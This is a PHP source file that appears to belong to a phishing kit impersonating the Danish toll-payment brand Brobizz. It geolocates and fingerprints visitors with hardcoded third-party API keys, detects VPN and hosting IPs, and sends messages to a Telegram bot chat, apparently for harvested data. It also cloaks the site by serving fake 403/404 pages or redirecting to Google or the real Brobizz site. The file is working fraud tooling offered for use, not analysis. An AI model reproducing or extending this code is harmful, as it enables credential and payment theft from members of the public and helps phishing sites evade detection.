<?php
// Brobizz Anti-Bot Protection System
date_default_timezone_set('Europe/Copenhagen'); // Denmark timezone
error_reporting(0);

class CSRF {
    public static function generate() {
        return $_SESSION['CSRF_KEY'] = base64_encode(openssl_random_pseudo_bytes(32));
    }
    public static function validate($csrf_token) {
        if(isset($_SESSION['CSRF_KEY']) && $_SESSION['CSRF_KEY'] == $csrf_token){
            return true;
        }else{
            return false;
        }
    }
}

function setIP(){
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    if(filter_var($remote, FILTER_VALIDATE_IP)){
        $ip = $remote;
    } elseif(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    } else {
        $ip = $forward;
    }
    return $ip;
}

function getIP($ip){
    if($ip == "127.0.0.1" || $ip == '::1') {
        $ip = "";
    }
    $ip_request = Belvok('https://ipapi.co/'.$ip.'/json/?key=DUZ3Rmb2NNSDAqxeAqcs6bM3pwLMRur0pW3BpQSamdM3rYXezs');
    $ip_data = json_decode($ip_request['content'], TRUE);
    if(!empty($ip_data['country_code']) && !empty($ip_data['country_name'])){
        $ip_info = [
            'countrycode' => $ip_data['country_code'],
            'countryname' => $ip_data['country_name'],
            'city'        => $ip_data['city'],
            'region'      => $ip_data['region']
        ];
    } else {
        $ip_data = @json_decode(file_get_contents('https://ipapi.co/'.$ip.'/json/?key=DUZ3Rmb2NNSDAqxeAqcs6bM3pwLMRur0pW3BpQSamdM3rYXezs'));
        if($ip_data && $ip_data->country_code != null && $ip_data->country_name != null) {
            $ip_info = [
                'countrycode' => $ip_data->country_code,
                'countryname' => $ip_data->country_name,
                'city'        => $ip_data->city,
                'region'      => $ip_data->region,
            ];
        }
    }
    return $ip_info;
}

function Belvok($url, $method = 'GET', $data = null, $cookies = null, $follow = false){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, strtoupper($method));
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    if($method == 'POST' && isset($data) === true) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    if(isset($cookies)) {
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
    }
    if($follow){
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    }
    $content = curl_exec($ch);
    if(!curl_errno($ch)){
        $return = [
            "status"        => curl_getinfo($ch, CURLINFO_HTTP_CODE),
            "redirect_url"  => curl_getinfo($ch, CURLINFO_REDIRECT_URL),
            "content"       => $content
        ];
    }
    curl_close($ch);
    return $return;
}

function getOS() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'      =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}

function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/brave/i'      =>  'Brave',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

function get_vpn($ip) {
    if($ip == "127.0.0.1" || $ip == '::1') {
        return "N";
    }
    
    $result = Belvok('https://pro.ip-api.com/json/'.$ip.'?key=UO8wl6MQD2zPxmf&fields=proxy,hosting');
    $data = json_decode($result['content'], true);
    
    if(isset($data['proxy']) && $data['proxy'] === true) {
        return "Y";
    }
    if(isset($data['hosting']) && $data['hosting'] === true) {
        return "Y";
    }
    
    return "N";
}

function getISP($ip) {
    if($ip == "127.0.0.1" || $ip == '::1') {
        $ip = "";
    }
    $content = Belvok('https://ipapi.co/'.$ip.'/org/?key=DUZ3Rmb2NNSDAqxeAqcs6bM3pwLMRur0pW3BpQSamdM3rYXezs');
	return $content['content'];
}

function p0llar($target, $message, $buttonText = "", $buttonUrl = "") {
    if($target == "ra3d"){
        $data = [
            'chat_id' => TELEGRAM_CHAT_ID,
            'text' => $message
        ];
        $url = "https://api.telegram.org/bot";
        $url .= TELEGRAM_BOT_TOKEN;
        $url .= "/sendMessage";
        $ret  = Belvok($url, 'POST', $data);
    }
    if($target == "ra4d"){
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => "ID: ".$buttonText, 'url' => $buttonUrl]
                ]
            ]
        ];
        $data = [
            'chat_id' => TELEGRAM_CHAT_ID,
            'text' => $message,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($keyboard)
        ];
        $url = "https://api.telegram.org/bot";
        $url .= TELEGRAM_BOT_TOKEN;
        $url .= "/sendMessage";
        $ret  = Belvok($url, 'POST', $data);
    }

    return $ret['content'];
}

function get_data($data) {
    $data = file_get_contents("db/$data.dat");
    $data = explode("\n", $data);
    return $data;
}

function put_data($file,$data){
    $handle = fopen($file, "a");
    fwrite($handle, $data."\n");
    fclose($handle);
}

function blocked($type) {
    if($type == "403") {
        header('HTTP/1.0 403 Forbidden', true, 403);
        die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    }
    if($type == "404") {
        header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
        die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
    }
    if($type == "Google") {
        header("location: https://google.com");
    }
    if($type == "Brobizz") {
        header("location: https://brobizz.com");
    }
    exit();
}
